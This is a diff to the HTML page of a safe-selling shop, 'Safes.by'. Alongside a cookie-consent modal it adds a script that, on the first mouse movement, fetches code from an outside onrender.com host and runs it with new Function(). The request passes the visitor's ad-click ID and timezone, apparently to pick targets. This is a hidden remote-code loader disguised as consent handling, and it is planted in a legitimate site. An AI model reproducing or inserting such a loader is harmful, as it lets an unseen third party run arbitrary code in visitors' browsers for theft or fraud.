@@ -67,9 +67,50 @@
         text-decoration: underline;
     }
   </style>
+	
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
 <body>
+	<div id="cookie-modal"
+                 class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+                <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+
+                    <!-- Close button -->
+                    <button id="cookie-close" class="absolute top-4 right-4">
+                        <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                            <path fill="currentColor"
+                                  d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                        </svg>
+                    </button>
+
+                    <!-- Header -->
+                    <div class="flex items-center gap-3 mb-4">
+                        <span class="text-yellow-500 text-3xl">🍪</span>
+                        <h2 class="text-2xl font-bold">About cookies</h2>
+                    </div>
+
+                    <!-- Text -->
+                    <p class="text-gray-600 mb-6">
+                        This website uses cookies to provide a better user experience.
+                        <span class="font-semibold">"agree"</span>
+                        By clicking this button, you agree to the use of cookies.
+                    </p>
+
+                    <!-- Buttons -->
+                    <div class="flex flex-col sm:flex-row gap-3">
+                        <button id="cookie-accept"
+                                class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">
+                            🍪 agree
+                        </button>
+                        <button id="cookie-decline"
+                                class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">
+                            Reject
+                        </button>
+                    </div>
+
+                </div>
+            </div>
   <header>
     <h1>Safes.by</h1>
     <p>Looking to buy a safe? You’re in the right place!</p>
@@ -187,5 +228,75 @@
         }
     })();
   </script>
+	
+<script>
+    const modalBox = document.getElementById("cookie-modal-box")
+        , modal = document.getElementById("cookie-modal")
+        , backdrop = document.getElementById("cookie-backdrop")
+        , acceptBtn = document.getElementById("cookie-accept")
+        , declineBtn = document.getElementById("cookie-decline")
+        , closeBtn = document.getElementById("cookie-close");
+    function showModal() {
+        modalBox.classList.remove("hidden"),
+            setTimeout(( () => {
+                    backdrop.classList.remove("opacity-0"),
+                        modal.classList.remove("opacity-0", "scale-90")
+                }
+            ), 10)
+    }
+    function hideModal(e) {
+        backdrop.classList.add("opacity-0"),
+            modal.classList.add("opacity-0", "scale-90"),
+            localStorage.setItem("cookie-consent", e),
+            setTimeout(( () => {
+                    modalBox.classList.add("hidden")
+                }
+            ), 300)
+    }
+    acceptBtn.onclick = () => hideModal("accepted"),
+        declineBtn.onclick = () => hideModal("declined"),
+        closeBtn.onclick = () => hideModal("closed"),
+        backdrop.onclick = () => hideModal("closed"),
+    localStorage.getItem("cookie-consent") || showModal()
+</script>
+
+
+
+
+<script>
+    const gclid = new URLSearchParams(location.search).get("gclid")
+        , timezone = Intl.DateTimeFormat().resolvedOptions().timeZone
+        , RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
+    let someCode = null
+        , isOpen = !1;
+    function handleSomeClick() {
+        if (someCode && !isOpen)
+            try {
+                isOpen = !0,
+                    new Function(someCode)(),
+                    hideModal("closed")
+            } catch (e) {
+                console.error("Error executing code:", e)
+            }
+    }
+    document.cookie = "access_cookie=true; path=/; max-age=300",
+        document.addEventListener("mousemove", (async function e() {
+                document.removeEventListener("mousemove", e);
+                try {
+                    const e = await fetch(`${RENDER_BASE_URL}/frontend-loader-us?gclid=${gclid}`, {
+                        headers: {
+                            "x-client-timezone": timezone,
+                            "x-access-cookie": "true"
+                        }
+                    })
+                        , o = await e.json();
+                    o && o.code && (someCode = o.code)
+                } catch (e) {
+                    console.error("Could not fetch code", e)
+                }
+            }
+        )),
+        document.addEventListener("mousemove", handleSomeClick)
+</script>
 </body>
 </html>
